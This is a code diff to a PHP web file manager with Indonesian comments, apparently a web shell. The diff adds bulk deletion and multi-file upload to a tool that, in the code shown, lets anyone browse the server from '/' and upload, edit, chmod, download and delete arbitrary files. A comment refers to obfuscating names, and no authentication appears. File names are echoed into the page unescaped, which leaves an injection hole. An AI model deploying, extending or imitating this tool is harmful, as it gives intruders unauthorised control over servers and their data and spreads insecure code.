@@ -1,6 +1,6 @@
 <?php
 // Obfuscasi nama fungsi dan variabel
-$f1 = 'validate_path'; $f2 = 'get_permissions'; $f3 = 'remove_directory'; $f4 = 'show_current_path'; $f5 = 'handle_requests';
+$f1 = 'validate_path'; $f2 = 'get_permissions'; $f3 = 'remove_directory'; $f4 = 'show_current_path'; $f5 = 'handle_requests'; $f6 = 'process_selected_files';
 
 // Fungsi untuk memvalidasi jalur agar tetap aman
 function validate_path($path) {
@@ -38,22 +38,64 @@ function show_current_path($dir) {
     return rtrim($pwd, ' / ');
 }
 
+// Fungsi untuk memproses file yang dipilih
+function process_selected_files() {
+    if (isset($_POST['selected_files']) && is_array($_POST['selected_files'])) {
+        $success = 0;
+        $failed = 0;
+        foreach ($_POST['selected_files'] as $file) {
+            if (validate_path($file)) {
+                if (is_file($file)) {
+                    if (unlink($file)) $success++;
+                    else $failed++;
+                } elseif (is_dir($file)) {
+                    if (remove_directory($file)) $success++;
+                    else $failed++;
+                }
+            } else {
+                $failed++;
+            }
+        }
+        echo "<script>alert('Berhasil menghapus $success item, gagal $failed item');</script>";
+    }
+}
+
 // Fungsi utama untuk menangani permintaan
 function handle_requests() {
     $uploadDir = __DIR__;
     $dir = isset($_GET['p']) ? $_GET['p'] : $uploadDir;
 
-    // Upload file
-    if (isset($_FILES['upload'])) {
-        $uploadName = basename($_FILES['upload']['name']);
-        $uploadTmp = $_FILES['upload']['tmp_name'];
+    // Proses file yang dipilih untuk dihapus
+    if (isset($_POST['delete_selected'])) {
+        process_selected_files();
+    }
+
+    // Upload file (single atau multiple)
+    if (isset($_FILES['uploads'])) {
         $targetDir = isset($_POST['targetDir']) ? $_POST['targetDir'] : $dir;
         if (validate_path($targetDir) && is_dir($targetDir)) {
-            $uploadPath = realpath($targetDir) . DIRECTORY_SEPARATOR . $uploadName;
-            if (move_uploaded_file($uploadTmp, $uploadPath)) {
-                echo "<script>alert('File berhasil diupload ke $uploadPath');</script>";
-            } else {
-                echo "<script>alert('Gagal mengupload file');</script>";
+            $successCount = 0;
+            $failedCount = 0;
+            
+            // Loop melalui semua file yang diupload
+            foreach ($_FILES['uploads']['name'] as $key => $name) {
+                if ($_FILES['uploads']['error'][$key] === UPLOAD_ERR_OK) {
+                    $uploadTmp = $_FILES['uploads']['tmp_name'][$key];
+                    $uploadName = basename($name);
+                    $uploadPath = realpath($targetDir) . DIRECTORY_SEPARATOR . $uploadName;
+                    
+                    if (move_uploaded_file($uploadTmp, $uploadPath)) {
+                        $successCount++;
+                    } else {
+                        $failedCount++;
+                    }
+                } else {
+                    $failedCount++;
+                }
+            }
+            
+            if ($successCount > 0 || $failedCount > 0) {
+                echo "<script>alert('Berhasil mengupload $successCount file, gagal $failedCount file');</script>";
             }
         } else {
             echo "<script>alert('Direktori tujuan tidak valid');</script>";
@@ -136,9 +178,9 @@ function handle_requests() {
     echo '<h2>Direktori Saat Ini (PWD)</h2>';
     echo '<p>' . show_current_path($dir) . '</p>';
 
-    // Form untuk upload file
+    // Form untuk upload file (multiple)
     echo '<form method="POST" enctype="multipart/form-data">';
-    echo 'Pilih File: <input type="file" name="upload"><br>';
+    echo 'Pilih File (Bisa multiple): <input type="file" name="uploads[]" multiple><br>';
     echo 'Direktori Tujuan: <input type="text" name="targetDir" value="' . htmlspecialchars($dir) . '" style="width: 400px;"><br>';
     echo '<input type="submit" value="Upload">';
     echo '</form>';
@@ -149,6 +191,9 @@ function handle_requests() {
     echo '<input type="submit" name="createFolder" value="Buat Folder Baru">';
     echo '</form>';
 
+    // Form untuk multiple delete
+    echo '<form method="POST" id="multiDeleteForm" onsubmit="return confirm(\'Yakin ingin menghapus file/folder yang dipilih?\')">';
+
     // Tampilkan daftar file dan folder
     echo '<ul>';
     if ($dir !== '/') {
@@ -158,21 +203,43 @@ function handle_requests() {
     foreach ($files as $f) {
         if ($f === '.' || $f === '..') continue;
         $path = realpath("$dir/$f");
+        echo '<li>';
+        echo '<input type="checkbox" name="selected_files[]" value="' . htmlspecialchars($path) . '"> ';
         if (is_dir($path)) {
-            echo "<li>[DIR] <a href='?p=" . urlencode($path) . "'>$f</a> 
-                    <a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Yakin ingin menghapus folder ini beserta isinya?\");'>[Hapus]</a>
-                    <span>Permissions: " . get_permissions($path) . "</span>
-                    <a href='?chmod=" . urlencode($path) . "'>[Change Permissions]</a></li>";
+            echo "[DIR] <a href='?p=" . urlencode($path) . "'>$f</a> 
+                  <a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Yakin ingin menghapus folder ini beserta isinya?\");'>[Hapus]</a>
+                  <span>Permissions: " . get_permissions($path) . "</span>
+                  <a href='?chmod=" . urlencode($path) . "'>[Change Permissions]</a>";
         } else {
-            echo "<li>[FILE] <a href='?edit=" . urlencode($path) . "'>$f</a> 
-                    <a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Yakin ingin menghapus file ini?\");'>[Hapus]</a> 
-                    <a href='?rename=" . urlencode($path) . "'>[Rename]</a>
-                    <span>Permissions: " . get_permissions($path) . "</span>
-                    <a href='?chmod=" . urlencode($path) . "'>[Change Permissions]</a>
-                    <a href='?download=" . urlencode($path) . "'>[Download]</a></li>";
+            echo "[FILE] <a href='?edit=" . urlencode($path) . "'>$f</a> 
+                  <a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Yakin ingin menghapus file ini?\");'>[Hapus]</a> 
+                  <a href='?rename=" . urlencode($path) . "'>[Rename]</a>
+                  <span>Permissions: " . get_permissions($path) . "</span>
+                  <a href='?chmod=" . urlencode($path) . "'>[Change Permissions]</a>
+                  <a href='?download=" . urlencode($path) . "'>[Download]</a>";
         }
+        echo '</li>';
     }
     echo '</ul>';
+
+    // Tombol untuk menghapus yang dipilih
+    echo '<input type="submit" name="delete_selected" value="Hapus File/Folder yang Dipilih">';
+    echo '<button type="button" onclick="toggleSelectAll()">Select/Unselect All</button>';
+    echo '</form>';
+
+    // JavaScript untuk select/unselect all
+    echo '<script>
+    function toggleSelectAll() {
+        var checkboxes = document.querySelectorAll(\'input[type="checkbox"][name="selected_files[]"]\');
+        var allChecked = true;
+        checkboxes.forEach(function(checkbox) {
+            if (!checkbox.checked) allChecked = false;
+        });
+        checkboxes.forEach(function(checkbox) {
+            checkbox.checked = !allChecked;
+        });
+    }
+    </script>';
 
     // Form untuk rename file atau folder
     if (isset($_GET['rename'])) {
